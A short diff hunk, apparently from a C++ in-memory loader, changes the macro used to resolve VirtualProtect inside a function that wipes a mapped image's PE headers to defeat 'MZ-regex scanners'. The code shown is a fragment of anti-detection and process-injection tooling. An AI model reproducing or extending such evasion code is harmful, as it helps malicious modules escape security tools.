@@ -71,7 +71,7 @@ inline void* map_image_into(void* process, void* file_handle, void** base_out,
 // a real, plausible header. Keep this only for adversaries confirmed to be
 // MZ-regex scanners. Callers must parse everything they need BEFORE wiping.
 inline bool wipe_headers(unsigned char* base, nocrt_size header_bytes) {
-    const auto vp = (int(__stdcall*)(void*, nocrt_size, unsigned long, unsigned long*))NOCRT_FN(
+    const auto vp = (int(__stdcall*)(void*, nocrt_size, unsigned long, unsigned long*))NOCRT_FN_RAW(
         "VirtualProtect");
     if (!vp) return false;
     unsigned long old = 0;
